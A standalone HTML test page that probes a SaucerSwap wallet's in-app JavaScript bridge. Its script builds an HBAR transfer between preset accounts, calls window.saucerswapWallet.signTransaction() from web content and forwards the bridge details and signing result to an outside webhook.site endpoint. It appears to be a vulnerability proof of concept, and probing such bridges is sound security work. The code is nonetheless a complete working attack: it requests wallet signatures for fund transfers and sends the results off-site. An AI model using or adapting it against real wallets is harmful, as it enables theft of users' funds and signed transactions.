<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<script src="https://unpkg.com/@hiero-ledger/sdk@2.70.0/dist/umd.js"></script>
<style>
  body { font-family: -apple-system, sans-serif; max-width: 640px; margin: 0 auto; padding: 16px; }
  input { width: 100%; padding: 8px; margin: 4px 0 12px; box-sizing: border-box; font-size: 16px; }
  button { padding: 14px 18px; margin: 6px 0; font-weight: 700; font-size: 16px; width: 100%; }
  #log { background: #111; color: #0f0; padding: 10px; font-size: 11px; white-space: pre-wrap; word-break: break-all; height: 350px; overflow-y: auto; margin-top: 12px; }
</style>
</head>
<body>
 
<h1>In-App Bridge Test → Webhook</h1>
<p>Calls <code>window.saucerswapWallet.signTransaction()</code> directly and forwards
the result to your webhook (no devtools needed to see it).</p>
 
<p>Webhook URL:</p>
<input id="webhookUrl" value="https://webhook.site/89541966-2677-41d6-985f-879b2c5f67d2">
 
<p>Owner: <input id="ownerId" value="0.0.10190152"></p>
<p>Recipient: <input id="recipientId" value="0.0.10130162"></p>
<p>Amount (tinybars): <input id="amountTinybars" value="100000000"></p>
 
<button onclick="runTest()">Call signTransaction() → forward result to webhook</button>
 
<pre id="log"></pre>
 
<script>
function log(msg) {
  const el = document.getElementById('log');
  el.textContent += new Date().toISOString() + " - " + msg + "\n";
  el.scrollTop = el.scrollHeight;
}
 
async function postToWebhook(label, data) {
  const url = document.getElementById('webhookUrl').value.trim();
  if (!url) { log('No webhook URL set.'); return; }
  const payload = JSON.stringify({ label, timestamp: new Date().toISOString(), data });
  try {
    // text/plain avoids a CORS preflight (OPTIONS) entirely — some embedded
    // WebViews don't complete the two-step preflight+POST handshake reliably.
    // webhook.site still parses/displays the body correctly either way.
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: payload
    });
    log('POSTed "' + label + '" to webhook.');
  } catch (e) {
    log('fetch POST failed (' + e.message + '), trying sendBeacon fallback…');
    try {
      const ok = navigator.sendBeacon(url, new Blob([payload], { type: 'text/plain' }));
      log(ok ? 'sendBeacon queued "' + label + '".' : 'sendBeacon also failed to queue.');
    } catch (e2) {
      log('sendBeacon threw: ' + e2.message);
    }
  }
}
 
async function runTest() {
  try {
    if (!window.saucerswapWallet) {
      log('window.saucerswapWallet NOT present in this context.');
      await postToWebhook('bridge_missing', { present: false });
      return;
    }
    log('window.saucerswapWallet is present. Keys: ' + Object.keys(window.saucerswapWallet).join(', '));
    await postToWebhook('bridge_present', { keys: Object.keys(window.saucerswapWallet) });
 
    const { TransferTransaction, AccountId, Hbar, TransactionId } = sdk;
    const ownerStr = document.getElementById('ownerId').value.trim();
    const recipientStr = document.getElementById('recipientId').value.trim();
    const amountTinybars = document.getElementById('amountTinybars').value.trim();
 
    const owner = AccountId.fromString(ownerStr);
    const recipient = AccountId.fromString(recipientStr);
 
    const tx = new TransferTransaction()
      .addHbarTransfer(owner, Hbar.fromTinybars(-amountTinybars))
      .addHbarTransfer(recipient, Hbar.fromTinybars(amountTinybars))
      .setTransactionId(TransactionId.generate(owner))
      .setNodeAccountIds([AccountId.fromString('0.0.3')])
      .freeze();
 
    const bytes = tx.toBytes();
    let binary = '';
    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
    const base64Bytes = btoa(binary);
 
    log('Built transaction, base64 length: ' + base64Bytes.length);
    log('⏱ Calling signTransaction() now — watch the device for any prompt.');
 
    const sentAt = new Date().toISOString();
    const t0 = performance.now();
    await postToWebhook('signTransaction_called', { sentAt, owner: ownerStr, recipient: recipientStr, amountTinybars });
 
    window.saucerswapWallet.signTransaction(base64Bytes)
      .then(async (result) => {
        const elapsed = (performance.now() - t0).toFixed(0);
        const receivedAt = new Date().toISOString();
        log('signTransaction() RESOLVED after ' + elapsed + 'ms: ' + JSON.stringify(result));
        await postToWebhook('signTransaction_resolved', { sentAt, receivedAt, elapsedMs: elapsed, result });
      })
      .catch(async (err) => {
        const elapsed = (performance.now() - t0).toFixed(0);
        const receivedAt = new Date().toISOString();
        log('signTransaction() REJECTED after ' + elapsed + 'ms: ' + err.message);
        await postToWebhook('signTransaction_rejected', { sentAt, receivedAt, elapsedMs: elapsed, message: err.message });
      });
  } catch (e) {
    log('Error: ' + e.message);
    await postToWebhook('script_error', { message: e.message });
  }
}
</script>
 
</body>
</html>
